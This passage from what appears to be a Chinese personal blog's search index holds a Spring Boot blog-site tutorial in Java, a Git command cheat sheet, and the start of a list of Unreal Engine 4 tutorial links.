blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\n分类Web模块TypeShowController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.TypeService;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;12&#x2F;16\n *&#x2F;\n@Controller\npublic class TypeShowController &#123;\n\n    @Autowired\n    private TypeService typeService;\n\n    @Autowired\n    private BlogService blogService;\n\n    @GetMapping(&quot;&#x2F;types&#x2F;&#123;id&#125;&quot;)\n    public String types(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC)Pageable pageable,@PathVariable Long id, Model model)&#123;\n        List&lt;Type&gt; types &#x3D; typeService.listTypeTop(10000);\n        if (id &#x3D;&#x3D; -1)&#123;\n            id &#x3D; types.get(0).getId();\n        &#125;\n        BlogQuery blogQuery &#x3D; new BlogQuery();\n        blogQuery.setTypeID(id);\n        model.addAttribute(&quot;types&quot;,types);\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(pageable,blogQuery));\n        model.addAttribute(&quot;activeTypeId&quot;,id);\n        return &quot;types&quot;;\n    &#125;\n&#125;\n标签Web模块TagShowController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.pojo.Tag;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.TagService;\nimport com.cxkj.blog.service.TypeService;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;12&#x2F;16\n *&#x2F;\n@Controller\npublic class TagShowController &#123;\n\n    @Autowired\n    private TagService tagService;\n\n    @Autowired\n    private BlogService blogService;\n\n    @GetMapping(&quot;&#x2F;tags&#x2F;&#123;id&#125;&quot;)\n    public String tags(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC)Pageable pageable,@PathVariable Long id, Model model)&#123;\n        List&lt;Tag&gt; tags &#x3D; tagService.listTagTop(10000);\n        if (id &#x3D;&#x3D; -1)&#123;\n            id &#x3D; tags.get(0).getId();\n        &#125;\n        model.addAttribute(&quot;tags&quot;,tags);\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(id,pageable));\n        model.addAttribute(&quot;activeTagId&quot;,id);\n        return &quot;tags&quot;;\n    &#125;\n&#125;\nBlogService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogService &#123;\n\n    Blog getBlog(Long id);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable);\n    \n    Page&lt;Blog&gt; listBlog(Long tagId,Pageable pageable);\n\n    Page&lt;Blog&gt; listBlog(String query,Pageable pageable);\n\n    Blog getAndConvert(Long id);\n\n    List&lt;Blog&gt; listRecommendBlogTop(Integer size);\n\n    Blog saveBlog(Blog blog);\n\n    Blog updateBlog(Long id,Blog blog);\n\n    void deleteBlog(Long id);\n&#125;\nBlogServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MarkdownUtils;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.*;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable) &#123;\n        return blogRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Long tagId, Pageable pageable) &#123;\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                Join join &#x3D; root.join(&quot;tags&quot;);\n                return criteriaBuilder.equal(join.get(&quot;id&quot;),tagId);\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(String query, Pageable pageable) &#123;\n        return blogRepository.findByQuery(query,pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog getAndConvert(Long id) &#123;\n        Blog blog &#x3D; blogRepository.findById(id).get();\n        if (blog &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;博客不存在哦&quot;);\n        &#125;\n        Blog b &#x3D; new Blog();\n        BeanUtils.copyProperties(blog,b);\n        String content &#x3D; b.getContent();\n        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));\n        blogRepository.updateViews(id);\n        return b;\n    &#125;\n\n    @Override\n    public List&lt;Blog&gt; listRecommendBlogTop(Integer size) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;updateTime&quot;);\n        Pageable pageable &#x3D; PageRequest.of(0,size,sort);\n        return blogRepository.findTop(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\n归档模块处理ArchiveShowController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.service.BlogService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;16.\n *&#x2F;\n@Controller\npublic class ArchiveShowController &#123;\n\n    @Autowired\n    private BlogService blogService;\n\n    @GetMapping(&quot;&#x2F;archives&quot;)\n    public String archives(Model model)&#123;\n        model.addAttribute(&quot;archiveMap&quot;,blogService.archiveBlog());\n        model.addAttribute(&quot;blogCouot&quot;,blogService.countBlog());\n        return &quot;archives&quot;;\n    &#125;\n&#125;\nBlogService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\nimport java.util.Map;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogService &#123;\n\n    Blog getBlog(Long id);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable);\n\n    Page&lt;Blog&gt; listBlog(Long tagId,Pageable pageable);\n\n    Page&lt;Blog&gt; listBlog(String query,Pageable pageable);\n\n    Blog getAndConvert(Long id);\n\n    List&lt;Blog&gt; listRecommendBlogTop(Integer size);\n    \n    Map&lt;String,List&lt;Blog&gt;&gt; archiveBlog();\n    \n    Long countBlog();\n\n    Blog saveBlog(Blog blog);\n\n    Blog updateBlog(Long id,Blog blog);\n\n    void deleteBlog(Long id);\n&#125;\nBlogServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MarkdownUtils;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.*;\nimport java.util.*;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable) &#123;\n        return blogRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Long tagId, Pageable pageable) &#123;\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                Join join &#x3D; root.join(&quot;tags&quot;);\n                return criteriaBuilder.equal(join.get(&quot;id&quot;),tagId);\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(String query, Pageable pageable) &#123;\n        return blogRepository.findByQuery(query,pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog getAndConvert(Long id) &#123;\n        Blog blog &#x3D; blogRepository.findById(id).get();\n        if (blog &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;博客不存在哦&quot;);\n        &#125;\n        Blog b &#x3D; new Blog();\n        BeanUtils.copyProperties(blog,b);\n        String content &#x3D; b.getContent();\n        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));\n        blogRepository.updateViews(id);\n        return b;\n    &#125;\n\n    @Override\n    public List&lt;Blog&gt; listRecommendBlogTop(Integer size) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;updateTime&quot;);\n        Pageable pageable &#x3D; PageRequest.of(0,size,sort);\n        return blogRepository.findTop(pageable);\n    &#125;\n\n    @Override\n    public Map&lt;String, List&lt;Blog&gt;&gt; archiveBlog() &#123;\n        \n        List&lt;String&gt; years &#x3D; blogRepository.findGroupYear();\n        Map&lt;String,List&lt;Blog&gt;&gt; map &#x3D; new HashMap&lt;&gt;();\n        for (String year : years)&#123;\n            map.put(year,blogRepository.findByYear(year));\n        &#125;\n        return map;\n    &#125;\n\n    @Override\n    public Long countBlog() &#123;\n        return blogRepository.count();\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\nBlogRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Blog;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.JpaSpecificationExecutor;\nimport org.springframework.data.jpa.repository.Modifying;\nimport org.springframework.data.jpa.repository.Query;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogRepository extends JpaRepository&lt;Blog,Long&gt;, JpaSpecificationExecutor&lt;Blog&gt; &#123;\n\n    @Query(&quot;select b from Blog b where b.recommend &#x3D; true&quot;)\n    List&lt;Blog&gt; findTop(Pageable pageable);\n\n    &#x2F;&#x2F;select * from t_blog where title like &#39;%内容%&#39;\n    @Query(&quot;select b from Blog b where b.title like ?1 or b.content like ?1&quot;)\n    Page&lt;Blog&gt; findByQuery(String query,Pageable pageable);\n\n    @Transactional\n    @Modifying\n    @Query(&quot;update Blog b set b.views &#x3D; b.views+1 where b.id &#x3D; ?1&quot;)\n    int updateViews(Long id);\n    \n    @Query(&quot;select function(&#39;date_format&#39;,b.updateTime,&#39;%Y&#39;) as year from Blog b group by function(&#39;date_format&#39;,b.updateTime,&#39;%Y&#39;) order by function(&#39;date_format&#39;,b.updateTime,&#39;%Y&#39;) desc &quot;)\n    List&lt;String&gt; findGroupYear();\n    @Query(&quot;select b from Blog b where function(&#39;date_format&#39;,b.updateTime,&#39;%Y&#39;) &#x3D; ?1&quot;)\n    List&lt;Blog&gt; findByYear(String year);\n&#125;\n个人模块处理AboutShowController.java\npackage com.cxkj.blog.web;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;12&#x2F;16\n *&#x2F;\n@Controller\npublic class AboutShowController &#123;\n\n    @GetMapping(&quot;&#x2F;about&quot;)\n    public String about()&#123;\n\n        return &quot;about&quot;;\n    &#125;\n\n&#125;\nmessages.properties\nindex.email&#x3D;Email: 2644266656@qq.com\nindex.qq&#x3D;QQ: 2644266656\nindex.tagcontext&#x3D;南有孤岛北有亡梦，南柯一梦终是虚无。\nindex.titlename&#x3D;Guest Island\nindex.kor&#x3D;Copyright &amp;copy; 2020-2021 Guest Island Personal blog\nblog.serurl&#x3D;127.0.0.1:8080","slug":"Spring_Blog","date":"2021-08-29T09:30:00.000Z","categories_index":"程序","tags_index":"教学文档,Java,程序开发,博客网站,Spring","author_index":"Arvin"},{"id":"bfcb3fbcb26721e95b0baa036371e1cb","title":"Git指令讲解","content":"\n\n查看、添加、提交、删除、找回，重置修改文件\n\n git help &lt;command&gt; # 显示command的help\n\n git show # 显示某次提交的内容 git show $id\n\n git co -- &lt;file&gt; # 抛弃工作区修改\n\n git co . # 抛弃工作区修改\n\n git add &lt;file&gt; # 将工作文件修改提交到本地暂存区\n\n git add . # 将所有修改过的工作文件提交暂存区\n\n git rm &lt;file&gt; # 从版本库中删除文件\n\n git rm &lt;file&gt; --cached # 从版本库中删除文件，但不删除文件\n\n git reset &lt;file&gt; # 从暂存区恢复到工作文件\n\n git reset -- . # 从暂存区恢复到工作文件\n\n git reset --hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改\n\n git ci &lt;file&gt; git ci . git ci -a # 将git add, git rm和git ci等操作都合并在一起做　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　git ci -am &quot;some comments&quot;\n\n git ci --amend # 修改最后一次提交记录\n\n git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建次提交对象\n\n git revert HEAD # 恢复最后一次提交的状态\n\n 查看文件diff\n\n\n git help &lt;command&gt; # 显示command的help\n\n git show # 显示某次提交的内容 git show $id\n\n git co -- &lt;file&gt; # 抛弃工作区修改\n\n git co . # 抛弃工作区修改\n\n git add &lt;file&gt; # 将工作文件修改提交到本地暂存区\n\n git add . # 将所有修改过的工作文件提交暂存区\n\n git rm &lt;file&gt; # 从版本库中删除文件\n\n git rm &lt;file&gt; --cached # 从版本库中删除文件，但不删除文件\n\n git reset &lt;file&gt; # 从暂存区恢复到工作文件\n\n git reset -- . # 从暂存区恢复到工作文件\n\n git reset --hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改\n\n git ci &lt;file&gt; git ci . git ci -a # 将git add, git rm和git ci等操作都合并在一起做　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　git ci -am &quot;some comments&quot;\n\n git ci --amend # 修改最后一次提交记录\n\n git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建次提交对象\n\n git revert HEAD # 恢复最后一次提交的状态\n\n 查看提交记录\n\n git log git log &lt;file&gt; # 查看该文件每次提交记录\n\n git log -p &lt;file&gt; # 查看每次详细修改内容的diff\n\n git log -p -2 # 查看最近两次详细修改内容的diff\n\n git log --stat #查看提交统计信息\n tig\n\n Mac上可以使用tig代替diff和log，brew install tig\n\n\n Git 本地分支管理\n 查看、切换、创建和删除分支\n\n git br -r # 查看远程分支\n\n git br &lt;new_branch&gt; # 创建新的分支\n\n git br -v # 查看各个分支最后提交信息\n\n git br --merged # 查看已经被合并到当前分支的分支\n\n git br --no-merged # 查看尚未被合并到当前分支的分支\n\n git co &lt;branch&gt; # 切换到某个分支\n\n git co -b &lt;new_branch&gt; # 创建新的分支，并且切换过去\n\n git co -b &lt;new_branch&gt; &lt;branch&gt; # 基于branch创建新的new_branch\n\n git co $id # 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除\n\n git co $id -b &lt;new_branch&gt; # 把某次历史提交记录checkout出来，创建成一个分支\n\n git br -d &lt;branch&gt; # 删除某个分支\n\n git br -D &lt;branch&gt; # 强制删除某个分支 (未被合并的分支被删除的时候需要强制)\n 分支合并和reba\n git merge &lt;branch&gt; # 将branch分支合并到当前分支\n\n git merge origin&#x2F;master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交\n\n git rebase master &lt;branch&gt; # 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt;\n Git补丁管理(方便在多台机器上开发同步时用)\n\n\n git merge &lt;branch&gt; # 将branch分支合并到当前分支\n\n git merge origin&#x2F;master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交\n\n git rebase master &lt;branch&gt; # 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt;\n\n Git暂存管\n git stash # 暂存\n\n git stash list # 列所有stash\n\n git stash apply # 恢复暂存的内容\n\n git stash drop # 删除暂存区\n\n Git远程分支管理\n\n git pull # 抓取远程仓库所有分支更新并合并到本地\n\n git pull --no-ff # 抓取远程仓库所有分支更新并合并到本地，不要快进合并\n\n git fetch origin # 抓取远程仓库更新\n\n git merge origin&#x2F;master # 将远程主分支合并到本地当前分支\n\n git co --track origin&#x2F;branch # 跟踪某个远程分支创建相应的本地分支\n\n git co -b &lt;local_branch&gt; origin&#x2F;&lt;remote_branch&gt; # 基于远程分支创建本地分支，功能同上\n\n git push # push所有分支\n\n git push origin master # 将本地主分支推到远程主分支\n\n git push -u origin master # 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)\n\n git push origin &lt;local_branch&gt; # 创建远程分支， origin是远程仓库名\n\n git push origin &lt;local_branch&gt;:&lt;remote_branch&gt; # 创建远程分支\n\n git push origin :&lt;remote_branch&gt; #先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支\n\n Git远程仓库管\n git remote -v # 查看远程服务器地址和仓库名称\n\n git remote show origin # 查看远程服务器仓库状态\n\n git remote add origin git@ github:robbin&#x2F;robbin_site.git # 添加远程仓库地址\n\n git remote set-url origin git@ github.com:robbin&#x2F;robbin_site.git # 设置远程仓库地址(用于修改远程仓库地址) git remote rm &lt;repository&gt; # 删除远程仓库\n\n 创建远程仓库\n\n git clone --bare robbin_site robbin_site.git # 用带版本的项目创建纯版本仓库\n\n scp -r my_project.git git@ git.csdn.net:~ # 将纯仓库上传到服务器上\n\n mkdir robbin_site.git &amp;&amp; cd robbin_site.git &amp;&amp; git --bare init # 在服务器创建纯仓库\n\n git remote add origin git@ github.com:robbin&#x2F;robbin_site.git # 设置远程仓库地址\n\n git push -u origin master # 客户端首次提交\n\n git push -u origin develop # 首次将本地develop分支提交到远程develop分支，并且track\n\n git remote set-head origin master # 设置远程仓库的HEAD指向master分支\n\n 也可以命令设置跟踪远程库和本地库\n\n git branch --set-upstream master origin&#x2F;master\n\n git branch --set-upstream develop origin&#x2F;develop","slug":"Git","date":"2021-08-29T09:23:00.000Z","categories_index":"程序","tags_index":"教学文档,git,程序开发","author_index":"Arvin"},{"id":"90d3d14985de9c9321edab5c3c6a5f3a","title":"散章（UE4）","content":"其他教程集合：\nhttps://blog.csdn.net/u012999985/article/details/107096741?spm=1001.2014.3001.5501\n\n蓝图入门：\n1.UE4序章：https://blog.csdn.net/qq_42145322/article/details/100671944\n\n2.UE4世界设置、输入控制、Tick事件、碰撞事件响应：https://blog.csdn.net/qq_42145322/article/details/100671988\n\n3.UE4材质：https://blog.csdn.net/qq_42145322/article/details/100672016\n\n4.UE4蓝图变量及其类型：https://blog.csdn.net/qq_42145322/article/details/100611688\n\n5.UE4蓝图枚举和结构体：https://blog.csdn.net/qq_42145322/article/details/100620667\n\n6.UE4蓝图流程控制：https://blog.csdn.net/qq_42145322/article/details/100620744\n\n7.UE4蓝图容器：https://blog.csdn.net/qq_42145322/article/details/100620784\n\n8.UE4函数：https://blog.csdn.net/qq_42145322/article/details/100620837\n\n9.UE4关卡蓝图：https://blog.csdn.net/qq_42145322/article/details/100620874\n\n10.UE4蓝图编辑界面介绍：https://blog.csdn.net/qq_42145322/article/details/100620913\n\n11.UE4蓝图宏：https://blog.csdn.net/qq_42145322/article/details/100620929\n\n12.UE4蓝图接口：https://blog.csdn.net/qq_42145322/article/details/100620976\n\n13.UE4蓝图事件调度器：https://blog.csdn.net/qq_42145322/article/details/100621053\n\n\n组件：\n缆绳组件：https://docs.unrealengine.com/4.26/zh-CN/Basics/Components/Rendering/CableComponent/\n\nScene Capture 2D Component的使用：https://www.cnblogs.com/timy/p/10018848.html\n\n移动组件详解（一）——移动框架与实现原理：https://blog.csdn.net/u012999985/article/details/78669508\n\n移动组件详解（二）——移动同步机制：https://blog.csdn.net/u012999985/article/details/78669947\n\n\n物理：\n物理系统浅析：https://blog.csdn.net/zzx023/article/details/82871707\n\n碰撞概述：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/Physics/Collision/Overview/\n\n碰撞响应参考：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/Physics/Collision/Reference/\n\n在建模软件里自定义碰撞体积：https://blog.csdn.net/a359877454/article/details/53410749\n\n\nAI：\nAI最简使用案例：https://gameinstitute.qq.com/community/detail/121929\n\n1.行为树快速入门指南：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeQuickStart/\n\n2.行为树概述：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreesOverview/\n\n3.行为树用户指南：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeUserGuide/\n\n4.行为树节点参考：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/\n\n5.复合节点：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceComposites/\n\n6.装饰器节点：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceDecorators/\n\n7.服务节点：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceServices/\n\n8.任务节点：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceTasks/\n\n9.场景查询系统快速入门：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSQuickStart/\n\n10.场景查询系统概述：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSOverview/\n\n11.场景查询系统用户指南：https://docs.unrealen